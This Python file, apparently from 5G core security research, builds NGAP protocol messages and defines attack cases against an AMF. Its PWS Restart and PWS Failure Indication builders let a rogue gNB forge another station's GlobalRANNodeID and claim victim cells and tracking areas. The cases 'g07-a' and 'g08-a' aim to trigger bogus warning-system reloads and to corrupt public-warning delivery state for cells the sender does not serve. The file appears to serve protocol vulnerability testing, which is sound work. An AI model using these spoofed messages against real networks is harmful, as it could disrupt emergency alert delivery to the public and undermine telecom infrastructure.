"""NGAP encoder builders + attack cases for g05-g08 (batch11 second-priority).

These are the four non-UE-associated interface-management / warning-message
procedures analysed in ngap_scaffold/output/batch11_secondpriority:

  g05 OVERLOAD START        procedureCode 22  (AMF -> NG-RAN; reverse-direction here)
  g06 OVERLOAD STOP         procedureCode 23  (AMF -> NG-RAN; reverse-direction here)
  g07 PWS RESTART INDICATION  procedureCode 34 (NG-RAN -> AMF)
  g08 PWS FAILURE INDICATION  procedureCode 33 (NG-RAN -> AMF)

None of these carry AMF-UE-NGAP-ID / RAN-UE-NGAP-ID, so the confirmed UE-context
binding flaw does not apply directly. The research value is:
  * OVERLOAD START/STOP: reverse-direction spoof toward the AMF (should be rejected)
    and, second-order, whether a gNB can induce the AMF to fan trusted overload
    control out to legitimate gNBs.
  * PWS RESTART / FAILURE INDICATION: whether the AMF binds the message's
    GlobalRANNodeID and the asserted Cell/TAI/Emergency-Area lists to the sending
    SCTP association / NG Setup identity, or lets a rogue gNB assert scope it does
    not own (confused-deputy toward CBCF/PWS-IWF + victim gNBs).

IE ids / TYPEs / criticality taken from 38413-g70.asn:
  OverloadStart(22): 2 AMFOverloadResponse(OverloadResponse,reject,O),
                     9 AMFTrafficLoadReductionIndication(TrafficLoadReductionIndication,ignore,O),
                     49 OverloadStartNSSAIList(OverloadStartNSSAIList,ignore,O)
  OverloadStop(23):  <empty IE set>
  PWSRestartIndication(34): 16 CellIDListForRestart(reject,M), 27 GlobalRANNodeID(reject,M),
                            104 TAIListForRestart(reject,M), 23 EmergencyAreaIDListForRestart(reject,O)
  PWSFailureIndication(33): 81 PWSFailedCellIDList(reject,M), 27 GlobalRANNodeID(reject,M)

This file owns its OWN builders; it does not edit builders.py. It reuses pure
helpers (encode_plmn, _snssai, _global_gnb_id) from builders.
"""
from __future__ import annotations

from . import builders as B, ngap

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- shared bits
def _nr_cgi(cfg: dict, nci: int):
    """A single NR-CGI (the cell an attacker claims/targets)."""
    return {"pLMNIdentity": B.encode_plmn(cfg["mcc"], cfg["mnc"]),
            "nRCellIdentity": (int(nci), 36)}


def _nr_cgi_list(cfg: dict, ncis):
    return [_nr_cgi(cfg, n) for n in ncis]


def _tai(cfg: dict, tac):
    return {"pLMNIdentity": B.encode_plmn(cfg["mcc"], cfg["mnc"]),
            "tAC": int(tac).to_bytes(3, "big")}


def _global_gnb(cfg: dict, gnb_id: int | None = None):
    if gnb_id is None:
        gnb_id = int(cfg["gnb_id"])
    return ("GlobalRANNodeID", B._global_gnb_id(cfg, gnb_id,
                                                int(cfg.get("gnb_id_len", 32))))


# ---------------------------------------------------------------- g05 OverloadStart
def overload_start(cfg: dict, *,
                   overload_action: str = "reject-non-emergency-mo-dt",
                   traffic_reduction: int | None = None,
                   nssai_slices=None):
    """OVERLOAD START (procedureCode 22). AMF -> NG-RAN by spec; a rogue gNB
    sending it toward the AMF is reverse-direction (should be rejected). All IEs
    are optional; we assert AMF-policy fields the attacker cannot legitimately set.

    overload_action    -> OverloadResponse/overloadAction (mandatory-ish 'key' IE)
    traffic_reduction  -> AMFTrafficLoadReductionIndication percentage (1..99)
    nssai_slices       -> list of (sst, sd) to build an OverloadStartNSSAIList that
                          scopes throttling to specific slices.
    """
    ies = []
    if overload_action is not None:
        ies.append({"id": 2, "criticality": "reject",
                    "value": ("OverloadResponse", ("overloadAction", overload_action))})
    if traffic_reduction is not None:
        ies.append({"id": 9, "criticality": "ignore",
                    "value": ("TrafficLoadReductionIndication", int(traffic_reduction))})
    if nssai_slices:
        items = []
        for sst, sd in nssai_slices:
            items.append({
                "sliceOverloadList": [{"s-NSSAI": B._snssai(int(sst), sd)}],
                "sliceOverloadResponse": ("overloadAction", overload_action
                                          or "reject-non-emergency-mo-dt"),
            })
        ies.append({"id": 49, "criticality": "ignore",
                    "value": ("OverloadStartNSSAIList", items)})
    return ("initiatingMessage", {
        "procedureCode": 22, "criticality": "ignore",
        "value": ("OverloadStart", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- g06 OverloadStop
def overload_stop(cfg: dict):
    """OVERLOAD STOP (procedureCode 23). Empty IE set. AMF -> NG-RAN by spec; a
    rogue gNB sending it toward the AMF probes reverse-direction acceptance and,
    if the AMF mutated global overload state from it, an overload-oscillation
    primitive against legitimate gNBs."""
    return ("initiatingMessage", {
        "procedureCode": 23, "criticality": "reject",
        "value": ("OverloadStop", {"protocolIEs": []}),
    })


# ---------------------------------------------------------------- g07 PWSRestartIndication
def pws_restart_indication(cfg: dict, *,
                           cell_ncis=(17,), tacs=(1,),
                           reporting_gnb_id: int | None = None,
                           emergency_area_ids=None):
    """PWS RESTART INDICATION (procedureCode 34). NG-RAN -> AMF.

    Asserts that PWS info for the given cells/TAIs (and optional emergency areas)
    must be reloaded. A rogue gNB can name victim cells/TAIs it does not serve and
    forge the reporting GlobalRANNodeID; if the AMF does not bind these to the NG
    Setup identity/SCTP association it forwards a trusted restart to CBCF/PWS-IWF.

    reporting_gnb_id=None -> attacker's own gNB id; set to a victim id to impersonate.
    """
    ies = [
        {"id": 16, "criticality": "reject",
         "value": ("CellIDListForRestart",
                   ("nR-CGIListforRestart", _nr_cgi_list(cfg, cell_ncis)))},
        {"id": 27, "criticality": "reject",
         "value": _global_gnb(cfg, reporting_gnb_id)},
        {"id": 104, "criticality": "reject",
         "value": ("TAIListForRestart", [_tai(cfg, t) for t in tacs])},
    ]
    if emergency_area_ids:
        ies.append({"id": 23, "criticality": "reject",
                    "value": ("EmergencyAreaIDListForRestart",
                              [bytes(e) if not isinstance(e, (bytes, bytearray))
                               else bytes(e) for e in emergency_area_ids])})
    return ("initiatingMessage", {
        "procedureCode": 34, "criticality": "reject",
        "value": ("PWSRestartIndication", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- g08 PWSFailureIndication
def pws_failure_indication(cfg: dict, *,
                           failed_ncis=(17,),
                           reporting_gnb_id: int | None = None):
    """PWS FAILURE INDICATION (procedureCode 33). NG-RAN -> AMF.

    Reports that ongoing PWS operation failed in the listed cells. A rogue gNB can
    list victim cells and/or forge the reporting GlobalRANNodeID; if the AMF does
    not verify cell ownership against the sending association it corrupts the
    public-warning delivery state for cells served by other gNBs.

    reporting_gnb_id=None -> attacker's own gNB id; set to a victim id to impersonate.
    """
    ies = [
        {"id": 81, "criticality": "reject",
         "value": ("PWSFailedCellIDList",
                   ("nR-CGI-PWSFailedList", _nr_cgi_list(cfg, failed_ncis)))},
        {"id": 27, "criticality": "reject",
         "value": _global_gnb(cfg, reporting_gnb_id)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 33, "criticality": "reject",
        "value": ("PWSFailureIndication", {"protocolIEs": ies}),
    })


# A victim gNB id distinct from the attacker's, used for impersonation cases.
_VICTIM_GNB = 0x9999


# ---------------------------------------------------------------- cases
CASES = [
    # g05 OverloadStart / g06 OverloadStop dropped: spec direction is AMF->NG-RAN,
    # so a gNB->AMF send is a reverse-direction probe, not a standalone attack.
    {"id": "g07-a", "msg": "PWSRestartIndication",
     "desc": "Cross-area false PWS restart: name victim cells/TAIs the sender doesn't "
             "serve -> AMF forwards a bogus warning-system reload for other gNBs' cells.",
     "build": lambda cfg: pws_restart_indication(cfg, cell_ncis=(0xABCDE, 0xABCDF),
                                                 tacs=(2, 3))},
    {"id": "g08-a", "msg": "PWSFailureIndication",
     "desc": "Forged victim-cell PWS failure: list cells served by other gNBs -> corrupts "
             "public-warning delivery state for cells the attacker doesn't own.",
     "build": lambda cfg: pws_failure_indication(cfg, failed_ncis=(0xABCDE, 0xABCDF))},
]


if __name__ == "__main__":
    for c in CASES:
        ngap.encode(c["build"](CFG))
    print("ALL ENCODE OK", len(CASES))
